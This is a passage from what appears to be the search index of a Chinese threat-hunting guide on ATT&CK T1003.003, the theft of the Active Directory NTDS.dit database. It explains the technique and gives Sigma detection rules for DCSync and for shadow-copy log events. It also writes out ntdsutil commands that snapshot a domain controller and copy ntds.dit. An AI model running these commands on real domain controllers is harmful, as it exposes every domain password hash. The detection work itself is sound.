\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\u5c06\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684\uff05SystemRoot\uff05\\NTDS\\Ntds.dit\u4e2d\u3002 \u4f46\u901a\u5e38\u5b58\u50a8\u5728\u5176\u4ed6\u903b\u8f91\u9a71\u52a8\u5668\u4e0a\uff09\u3002AD\u6570\u636e\u5e93\u662f\u4e00\u4e2aJet\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5b83\u4f7f\u7528\u53ef\u6269\u5c55\u5b58\u50a8\u5f15\u64ce\uff08ESE\uff09\u63d0\u4f9b\u6570\u636e\u5b58\u50a8\u548c\u7d22\u5f15\u670d\u52a1\u3002\u901a\u8fc7ESE\u7ea7\u522b\u7d22\u5f15\uff0c\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5bf9\u8c61\u5c5e\u6027\u3002 \u6d4b\u8bd5\u6848\u4f8b \u57282008+\u57df\u63a7\u4e0a\u4f7f\u7528 ntdsutil snapshot mount\u5bfc\u51fantds.dit \u521b\u5efa\u5feb\u7167 ntdsutil snapshot \"activate instance ntds\" create quit quit Ntdsutil\u6302\u8f7d\u57df\u5feb\u7167 ntdsutil snapshot \"mount {GUID}\" quit quit \u590d\u5236\u5feb\u7167 copy C:\\$SNAP_201212082315_VOLUMEC$\\windows\\NTDS\\ntds.dit c:\\ntds.dit #\u6ce8\u610f\u8def\u5f84\u5927\u5c0f\u5199\u95ee\u9898 \u5378\u8f7d\u5feb\u7167 ntdsutil snapshot \"unmount {GUID}\" quit quit \u5220\u9664\u5feb\u7167 ntdsutil snapshot \"delete {GUID}\" quit quit ntsutil.exe +PWPR(Passcape Windows Password Recovery) \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd7\u30014688\u8fdb\u7a0b\u521b\u5efa\u3001Ntsutil.exe\u8fdb\u7a0b\u540d\u79f0\u3002 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def title: Dumping ntds.dit remotely via DCSync id: 51238c62-2b29-4539-ad75-e94575368a12 description: ntds.dit retrieving using synchronisation with legitimate domain controller using Directory Replication Service Remote Protocol author: Teymur Kheirkhabarov, oscd.community date: 2019/10/24 modified: 2019/11/13 references: - https://twitter.com/gentilkiwi/status/1003236624925413376 - https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2 - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment tags: - attack.credential_access - attack.t1003 logsource: product: windows service: security detection: selection1: EventID: 4624 ComputerName: '%DomainControllersNamesList%' selection2: IpAddress: '%DomainControllersIpsList%' selection3: EventID: 4662 ComputerName: '%DomainControllersNamesList%' SubjectLogonId: '%SuspiciousTargetLogonIdList%' Properties|contains: - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' condition: write TargetLogonId from selection1 (if not selection2) to list %SuspiciousTargetLogonIdList%; then if selection3 -> alert falsepositives: - Legitimate administrator adding new domain controller to already existing domain level: medium status: experimental \u5efa\u8bae \u68c0\u6d4b\u89c4\u5219\u672a\u7ecf\u8fc7\u5b9e\u9645\u9a8c\u8bc1\uff0c\u8c28\u614e\u4f7f\u7528\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1003-003 https://attack.mitre.org/techniques/T1003/003 \u57df\u6e17\u900f\u2014\u2014\u83b7\u5f97\u57df\u63a7\u670d\u52a1\u5668\u7684NTDS.dit\u6587\u4ef6 https://xz.aliyun.com/t/2187 NTDS.dit\u5bc6\u7801\u5feb\u901f\u63d0\u53d6\u5de5\u5177 https://www.secpulse.com/archives/6301.html \u57dfhash\u503c\u7834\u89e3\u7684\u603b\u7ed3\u7ecf\u9a8c https://www.cnblogs.com/backlion/p/6785639.html?utm_source=itdadao&utm_medium=referral","title":"T1003-003-win-\u4f7f\u7528ntdsutil\u83b7\u5f97NTDS.dit\u6587\u4ef6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#t1003-003-win-ntdsutilntdsdit","text":"","title":"T1003-003-win-\u4f7f\u7528ntdsutil\u83b7\u5f97NTDS.dit\u6587\u4ef6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u6216\u521b\u5efaActive Directory\u57df\u6570\u636e\u5e93\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u7a83\u53d6\u51ed\u636e\u4fe1\u606f\uff0c\u4ee5\u53ca\u83b7\u53d6\u6709\u5173\u57df\u6210\u5458\uff08\u4f8b\u5982\u8bbe\u5907\uff0c\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\uff09\u7684\u5176\u4ed6\u4fe1\u606f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\uff08NTDS.dit\uff09\u4f4d\u4e8e%SystemRoot%\\NTDS\\Ntds.dit\u57df\u63a7\u5236\u5668\u4e2d\u3002 \u9664\u4e86\u5728\u6d3b\u52a8\u7684\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u627eNTDS\u6587\u4ef6\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u641c\u7d22\u5305\u542b\u76f8\u540c\u6216\u76f8\u4f3c\u4fe1\u606f\u7684\u5907\u4efd\u3002 \u4e0b\u5217\u5de5\u5177\u548c\u6280\u672f\u53ef\u7528\u4e8e\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\u3002 \u5377\u5f71\u590d\u5236 secretsdump.py \u4f7f\u7528\u5185\u7f6e\u7684Windows\u5de5\u5177ntdsutil.exe \u8c03\u7528\u5377\u5f71\u526f\u672c","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#ntdsdit","text":"Ntds.dit\u6587\u4ef6\u662f\u5b58\u50a8Active Directory\u6570\u636e\u7684\u6570\u636e\u5e93\uff0c\u5305\u62ec\u6709\u5173\u7528\u6237\u5bf9\u8c61\uff0c\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u7684\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u3002\u57df\u63a7\u5236\u5668\uff08DC\uff09\u4e0a\u7684ntds.dit\u6587\u4ef6\u53ea\u80fd\u7531\u53ef\u4ee5\u767b\u5f55\u5230DC\u7684\u7528\u6237\u8bbf\u95ee\u3002\u5f88\u660e\u663e\uff0c\u4fdd\u62a4\u8fd9\u4e2a\u6587\u4ef6\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5bfc\u81f4\u6574\u4e2a\u57df\u6ca6\u9677\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\u5c06\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684\uff05SystemRoot\uff05\\NTDS\\Ntds.dit\u4e2d\u3002 \u4f46\u901a\u5e38\u5b58\u50a8\u5728\u5176\u4ed6\u903b\u8f91\u9a71\u52a8\u5668\u4e0a\uff09\u3002AD\u6570\u636e\u5e93\u662f\u4e00\u4e2aJet\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5b83\u4f7f\u7528\u53ef\u6269\u5c55\u5b58\u50a8\u5f15\u64ce\uff08ESE\uff09\u63d0\u4f9b\u6570\u636e\u5b58\u50a8\u548c\u7d22\u5f15\u670d\u52a1\u3002\u901a\u8fc7ESE\u7ea7\u522b\u7d22\u5f15\uff0c\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5bf9\u8c61\u5c5e\u6027\u3002","title":"NTDS.dit"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_1","text":"\u57282008+\u57df\u63a7\u4e0a\u4f7f\u7528 ntdsutil snapshot mount\u5bfc\u51fantds.dit","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_2","text":"ntdsutil snapshot \"activate instance ntds\" create quit quit","title":"\u521b\u5efa\u5feb\u7167"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#ntdsutil","text":"ntdsutil snapshot \"mount {GUID}\" quit quit","title":"Ntdsutil\u6302\u8f7d\u57df\u5feb\u7167"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_3","text":"copy C:\\$SNAP_201212082315_VOLUMEC$\\windows\\NTDS\\ntds.dit c:\\ntds.dit #\u6ce8\u610f\u8def\u5f84\u5927\u5c0f\u5199\u95ee\u9898","title":"\u590d\u5236\u5feb\u7167"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_4","text":"ntdsutil snapshot \"unmount {GUID}\" quit quit","title":"\u5378\u8f7d\u5feb\u7167"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_5","text":"ntdsutil snapshot \"delete {GUID}\" quit quit ntsutil.exe +PWPR(Passcape Windows Password Recovery)","title":"\u5220\u9664\u5feb\u7167"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_6","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_7","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_8","text":"windows \u5b89\u5168\u65e5\u5fd7\u30014688\u8fdb\u7a0b\u521b\u5efa\u3001Ntsutil.exe\u8fdb\u7a0b\u540d\u79f0\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_9","text":"title: Dumping ntds.dit remotely via DCSync id: 51238c62-2b29-4539-ad75-e94575368a12 description: ntds.dit retrieving using synchronisation with legitimate domain controller using Directory Replication Service Remote Protocol author: Teymur Kheirkhabarov, oscd.community date: 2019/10/24 modified: 2019/11/13 references: - https://twitter.com/gentilkiwi/status/1003236624925413376 - https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2 - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment tags: - attack.credential_access - attack.t1003 logsource: product: windows service: security detection: selection1: EventID: 4624 ComputerName: '%DomainControllersNamesList%' selection2: IpAddress: '%DomainControllersIpsList%' selection3: EventID: 4662 ComputerName: '%DomainControllersNamesList%' SubjectLogonId: '%SuspiciousTargetLogonIdList%' Properties|contains: - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' condition: write TargetLogonId from selection1 (if not selection2) to list %SuspiciousTargetLogonIdList%; then if selection3 -> alert falsepositives: - Legitimate administrator adding new domain controller to already existing domain level: medium status: experimental","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_10","text":"\u68c0\u6d4b\u89c4\u5219\u672a\u7ecf\u8fc7\u5b9e\u9645\u9a8c\u8bc1\uff0c\u8c28\u614e\u4f7f\u7528\u3002","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_11","text":"MITRE-ATT&CK-T1003-003 https://attack.mitre.org/techniques/T1003/003 \u57df\u6e17\u900f\u2014\u2014\u83b7\u5f97\u57df\u63a7\u670d\u52a1\u5668\u7684NTDS.dit\u6587\u4ef6 https://xz.aliyun.com/t/2187 NTDS.dit\u5bc6\u7801\u5feb\u901f\u63d0\u53d6\u5de5\u5177 https://www.secpulse.com/archives/6301.html \u57dfhash\u503c\u7834\u89e3\u7684\u603b\u7ed3\u7ecf\u9a8c https://www.cnblogs.com/backlion/p/6785639.html?utm_source=itdadao&utm_medium=referral","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/","text":"T1003-003-win-\u57fa\u4e8e\u5e94\u7528\u65e5\u5fd7\u68c0\u6d4bNtdsutil\u83b7\u53d6\u51ed\u8bc1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u6216\u521b\u5efaActive Directory\u57df\u6570\u636e\u5e93\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u7a83\u53d6\u51ed\u636e\u4fe1\u606f\uff0c\u4ee5\u53ca\u83b7\u53d6\u6709\u5173\u57df\u6210\u5458\uff08\u4f8b\u5982\u8bbe\u5907\uff0c\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\uff09\u7684\u5176\u4ed6\u4fe1\u606f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\uff08NTDS.dit\uff09\u4f4d\u4e8e%SystemRoot%\\NTDS\\Ntds.dit\u57df\u63a7\u5236\u5668\u4e2d\u3002 \u9664\u4e86\u5728\u6d3b\u52a8\u7684\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u627eNTDS\u6587\u4ef6\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u641c\u7d22\u5305\u542b\u76f8\u540c\u6216\u76f8\u4f3c\u4fe1\u606f\u7684\u5907\u4efd\u3002 \u4e0b\u5217\u5de5\u5177\u548c\u6280\u672f\u53ef\u7528\u4e8e\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\u3002 \u5377\u5f71\u590d\u5236 secretsdump.py \u4f7f\u7528\u5185\u7f6e\u7684Windows\u5de5\u5177ntdsutil.exe \u8c03\u7528\u5377\u5f71\u526f\u672c NTDS.dit Ntds.dit\u6587\u4ef6\u662f\u5b58\u50a8Active Directory\u6570\u636e\u7684\u6570\u636e\u5e93\uff0c\u5305\u62ec\u6709\u5173\u7528\u6237\u5bf9\u8c61\uff0c\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u7684\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u3002\u57df\u63a7\u5236\u5668\uff08DC\uff09\u4e0a\u7684ntds.dit\u6587\u4ef6\u53ea\u80fd\u7531\u53ef\u4ee5\u767b\u5f55\u5230DC\u7684\u7528\u6237\u8bbf\u95ee\u3002\u5f88\u660e\u663e\uff0c\u4fdd\u62a4\u8fd9\u4e2a\u6587\u4ef6\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5bfc\u81f4\u6574\u4e2a\u57df\u6ca6\u9677\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\u5c06\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684\uff05SystemRoot\uff05\\NTDS\\Ntds.dit\u4e2d\u3002 \u4f46\u901a\u5e38\u5b58\u50a8\u5728\u5176\u4ed6\u903b\u8f91\u9a71\u52a8\u5668\u4e0a\uff09\u3002AD\u6570\u636e\u5e93\u662f\u4e00\u4e2aJet\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5b83\u4f7f\u7528\u53ef\u6269\u5c55\u5b58\u50a8\u5f15\u64ce\uff08ESE\uff09\u63d0\u4f9b\u6570\u636e\u5b58\u50a8\u548c\u7d22\u5f15\u670d\u52a1\u3002\u901a\u8fc7ESE\u7ea7\u522b\u7d22\u5f15\uff0c\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5bf9\u8c61\u5c5e\u6027\u3002 \u6d4b\u8bd5\u6848\u4f8b \u53c2\u8003\u94fe\u63a5\uff1a \u57df\u6e17\u900f\u2014\u2014\u83b7\u5f97\u57df\u63a7\u670d\u52a1\u5668\u7684NTDS.dit\u6587\u4ef6\uff1a https://blog.csdn.net/Fly_hps/article/details/80641987 \u68c0\u6d4b\u65e5\u5fd7 windows \u5e94\u7528\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6d4b\u8bd5\u7559\u75d5 windows \u5e94\u7528\u65e5\u5fd7\u7559\u75d5\u6587\u4ef6\uff1a https://github.com/12306Bro/Threathunting-book/blob/master/Eventdata/ntds.evtx \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u5e94\u7528\u65e5\u5fd7\u68c0\u6d4bntdsutil\u83b7\u53d6NTDS.dit\u6587\u4ef6 description: windows server 2008 + AD\u57df\u63a7 references: https://blog.csdn.net/Fly_hps/article/details/80641987 tags: T1003-003 status: experimental author: 12306Bro logsource: product: windows service: application detection: selection1: EventID: 2005 Message: 'lsass (*) \u5377\u5f71\u590d\u5236\u5b9e\u4f8b * \u6b63\u5728\u542f\u52a8\u3002\u8fd9\u5c06\u662f\u4e00\u6b21\u5b8c\u6574\u7684\u5377\u5f71\u590d\u5236\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d selection2: EventID: 2001 Message: 'lsass (*) \u5377\u5f71\u526f\u672c\u5b9e\u4f8b * \u51bb\u7ed3\u5df2\u5f00\u59cb\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d selection3: EventID: 2003 Message: 'lsass (*) \u5377\u5f71\u526f\u672c\u5b9e\u4f8b * \u51bb\u7ed3\u5df2\u505c\u6b62\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d selection4: EventID: 2006 Message: 'lsass (*) \u5377\u5f71\u590d\u5236\u5b9e\u4f8b * \u5df2\u6210\u529f\u5b8c\u6210\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d selection5: EventID: 300 Message: lsass (*) \u6570\u636e\u5e93\u5f15\u64ce\u6b63\u5728\u521d\u59cb\u5316\u6062\u590d\u6b65\u9aa4\u3002 #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d selection6: EventID: 216 #\u671f\u95f4\u89e6\u53d1\u5927\u91cf216\u4e8b\u4ef6 Message: 'lsass (*) \u68c0\u6d4b\u5230\u6570\u636e\u5e93\u4f4d\u7f6e\u4ece\u201cC:\\Windows\\NTDS\\ntds.dit\u201d\u66f4\u6539\u4e3a\u201c\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy*1*\\Windows\\NTDS\\ntds.dit\u201d\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d selection7: EventID: 302 Message: 'lsass (*) \u6570\u636e\u5e93\u5f15\u64ce\u5df2\u6210\u529f\u5b8c\u6210\u6062\u590d\u6b65\u9aa4\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d \u200b timeframe: last 10S #\u81ea\u5b9a\u4e49\u65f6\u95f4\u8303\u56f4 condition: all of them level: medium \u5efa\u8bae \u6b64\u68c0\u6d4b\u7279\u5f81\u4ec5\u9002\u7528\u4e8ewindows AD\u57df\u63a7\u4e3b\u673a\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1003-003 https://attack.mitre.org/techniques/T1003/003 \u57df\u6e17\u900f\u2014\u2014\u83b7\u5f97\u57df\u63a7\u670d\u52a1\u5668\u7684NTDS.dit\u6587\u4ef6 https://xz.aliyun.com/t/2187 NTDS.dit\u5bc6\u7801\u5feb\u901f\u63d0\u53d6\u5de5\u5177 https://www.secpulse.com/archives/6301.html MITRE ATT&CK\u653b\u51fb\u77e5\u8bc6\u5e93\uff08\u4f01\u4e1a\uff09\u4e2d\u6587\u7248 https://hansight.github.io/#/","title":"T1003-003-win-\u57fa\u4e8e\u5e94\u7528\u65e5\u5fd7\u68c0\u6d4bNtdsutil\u83b7\u53d6\u51ed\u8bc1"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#t1003-003-win-ntdsutil","text":"","title":"T1003-003-win-\u57fa\u4e8e\u5e94\u7528\u65e5\u5fd7\u68c0\u6d4bNtdsutil\u83b7\u53d6\u51ed\u8bc1"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u6216\u521b\u5efaActive Directory\u57df\u6570\u636e\u5e93\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u7a83\u53d6\u51ed\u636e\u4fe1\u606f\uff0c\u4ee5\u53ca\u83b7\u53d6\u6709\u5173\u57df\u6210\u5458\uff08\u4f8b\u5982\u8bbe\u5907\uff0c\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\uff09\u7684\u5176\u4ed6\u4fe1\u606f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\uff08NTDS.dit\uff09\u4f4d\u4e8e%SystemRoot%\\NTDS\\Ntds.dit\u57df\u63a7\u5236\u5668\u4e2d\u3002 \u9664\u4e86\u5728\u6d3b\u52a8\u7684\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u627eNTDS\u6587\u4ef6\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u641c\u7d22\u5305\u542b\u76f8\u540c\u6216\u76f8\u4f3c\u4fe1\u606f\u7684\u5907\u4efd\u3002 \u4e0b\u5217\u5de5\u5177\u548c\u6280\u672f\u53ef\u7528\u4e8e\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\u3002 \u5377\u5f71\u590d\u5236 secretsdump.py \u4f7f\u7528\u5185\u7f6e\u7684Windows\u5de5\u5177ntdsutil.exe \u8c03\u7528\u5377\u5f71\u526f\u672c","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#ntdsdit","text":"Ntds.dit\u6587\u4ef6\u662f\u5b58\u50a8Active Directory\u6570\u636e\u7684\u6570\u636e\u5e93\uff0c\u5305\u62ec\u6709\u5173\u7528\u6237\u5bf9\u8c61\uff0c\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u7684\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u3002\u57df\u63a7\u5236\u5668\uff08DC\uff09\u4e0a\u7684ntds.dit\u6587\u4ef6\u53ea\u80fd\u7531\u53ef\u4ee5\u767b\u5f55\u5230DC\u7684\u7528\u6237\u8bbf\u95ee\u3002\u5f88\u660e\u663e\uff0c\u4fdd\u62a4\u8fd9\u4e2a\u6587\u4ef6\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5bfc\u81f4\u6574\u4e2a\u57df\u6ca6\u9677\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\u5c06\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684\uff05SystemRoot\uff05\\NTDS\\Ntds.dit\u4e2d\u3002 \u4f46\u901a\u5e38\u5b58\u50a8\u5728\u5176\u4ed6\u903b\u8f91\u9a71\u52a8\u5668\u4e0a\uff09\u3002AD\u6570\u636e\u5e93\u662f\u4e00\u4e2aJet\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5b83\u4f7f\u7528\u53ef\u6269\u5c55\u5b58\u50a8\u5f15\u64ce\uff08ESE\uff09\u63d0\u4f9b\u6570\u636e\u5b58\u50a8\u548c\u7d22\u5f15\u670d\u52a1\u3002\u901a\u8fc7ESE\u7ea7\u522b\u7d22\u5f15\uff0c\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5bf9\u8c61\u5c5e\u6027\u3002","title":"NTDS.dit"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#_1","text":"\u53c2\u8003\u94fe\u63a5\uff1a \u57df\u6e17\u900f\u2014\u2014\u83b7\u5f97\u57df\u63a7\u670d\u52a1\u5668\u7684NTDS.dit\u6587\u4ef6\uff1a https://blog.csdn.net/Fly_hps/article/details/80641987","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#_2","text":"windows 